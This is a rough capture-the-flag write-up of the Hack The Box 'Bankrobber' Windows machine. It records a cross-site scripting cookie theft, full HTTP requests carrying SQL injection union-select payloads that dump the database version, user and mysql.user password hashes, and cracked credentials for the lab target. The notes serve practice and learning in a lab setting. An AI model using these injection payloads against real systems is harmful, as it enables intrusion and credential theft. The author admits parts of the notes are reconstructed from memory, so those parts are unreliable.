# Bankrobber

- Difficulty: "Insane"
- Platform: Windows
---

10.10.10.154

## Nmap
```nmap
I wiped out disk without backing up notes like an idiot... 
picking up from web-admin access

The Rundown:

Esentially, there is a database user search and and E-Coin transfer service. 
The transfer service is manually reviewed by an administrator. 

The filed inputs do not validate/sanitize.
A cross-site scripting attack is possible, although finicky, returning the administrator's cookie within the response headers.

There seems to be SQL-Injection present in the user database lookup, although I have yet to go any further. I am conflating both these things together and I forget what I actually did ut oh well... continuing.
```

`admin:Hopelessromantic`

A regular union select statement reveals version `MariaDB-10.1.38` in field 2:`
```http
POST /admin/search.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

term=1'union+select+1,@@version,3-- -
```

```
term=1'union+select+1,user()+from+mysql.user,3-- -
user: `root@localhost`

lucky guess:
term=1'union slect user,password,3 from mysql.user--
hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
```

SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. Connections aren't permitted to the MySQL service from an external IP. Localhost only:
```bash
➜  loot git:(main) ✗ mysql -u 'gio' -p 'Welkom1!' -h 10.10.10.154
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 

ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB server
```

